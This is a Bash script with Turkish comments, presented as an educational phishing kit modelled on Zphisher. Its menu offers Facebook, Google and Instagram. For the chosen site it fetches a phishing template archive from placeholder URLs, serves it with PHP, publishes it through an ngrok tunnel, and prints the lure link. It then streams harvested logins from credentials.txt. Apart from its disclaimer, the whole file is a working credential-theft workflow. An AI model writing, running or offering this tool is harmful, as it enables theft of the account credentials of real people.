#!/bin/bash

# Eğitim amaçlı basit bir phishing aracı (Zphisher benzeri)
# YASA DIŞI KULLANIM İÇİN TASARLANMAMIŞTIR. SADECE ETİK TESTLER İÇİNDİR.

# Renkler
RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
NC='\033[0m'

# Bağımlılıklar
dependencies=("php" "wget" "unzip" "curl")

# Bağımlılık kontrolü
check_deps() {
  for dep in "${dependencies[@]}"; do
    if ! command -v "$dep" &> /dev/null; then
      echo -e "${RED}[!] Hata: $dep kurulu değil.${NC}"
      exit 1
    fi
  done
}

# Temizlik
cleanup() {
  echo -e "\n${GREEN}[+] Temizlik yapılıyor...${NC}"
  killall php > /dev/null 2>&1
  killall ngrok > /dev/null 2>&1
  rm -rf sites/
}

# Menü
menu() {
  clear
  echo -e "${CYAN}
   ███████╗██████╗ ██╗  ██╗██╗███████╗
   ╚══███╔╝██╔══██╗██║  ██║██║██╔════╝
     ███╔╝ ██████╔╝███████║██║███████╗
    ███╔╝  ██╔═══╝ ██╔══██║██║╚════██║
   ███████╗██║     ██║  ██║██║███████║
   ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝
  ${NC}"
  echo -e "${GREEN}[1] Facebook"
  echo -e "[2] Google"
  echo -e "[3] Instagram"
  echo -e "[4] Çıkış${NC}"
  read -p "Seçim yapın: " choice

  case $choice in
    1) setup "facebook";;
    2) setup "google";;
    3) setup "instagram";;
    4) cleanup && exit;;
    *) echo -e "${RED}Geçersiz seçim!${NC}"; sleep 1; menu;;
  esac
}

# Site kurulumu
setup() {
  site=$1
  echo -e "\n${GREEN}[+] $site klonlanıyor...${NC}"
  mkdir -p sites/$site
  case $site in
    "facebook") template_url="https://github.com/example/facebook-phishing/archive/main.zip";;
    "google") template_url="https://github.com/example/google-phishing/archive/main.zip";;
    "instagram") template_url="https://github.com/example/instagram-phishing/archive/main.zip";;
  esac
  
  wget -q "$template_url" -O sites/$site/temp.zip
  unzip -q sites/$site/temp.zip -d sites/$site/
  rm sites/$site/temp.zip
  start_server $site
}

# Sunucu ve tünel başlatma
start_server() {
  site=$1
  echo -e "\n${GREEN}[+] PHP sunucusu başlatılıyor...${NC}"
  php -S 127.0.0.1:8080 -t sites/$site/ > /dev/null 2>&1 &
  sleep 2
  
  echo -e "\n${CYAN}[+] Tünel başlatılıyor (ngrok)...${NC}"
  ngrok http 8080 > /dev/null 2>&1 &
  sleep 5
  
  # Ngrok URL'sini al
  ngrok_url=$(curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')
  echo -e "\n${GREEN}[+] Phishing Linki: $ngrok_url ${NC}"
  
  # Kimlik bilgilerini izleme
  echo -e "\n${CYAN}[+] Kimlik bilgileri bekleniyor...${NC}"
  tail -f sites/$site/credentials.txt
}

# Ana işlem
trap cleanup EXIT
check_deps
menu
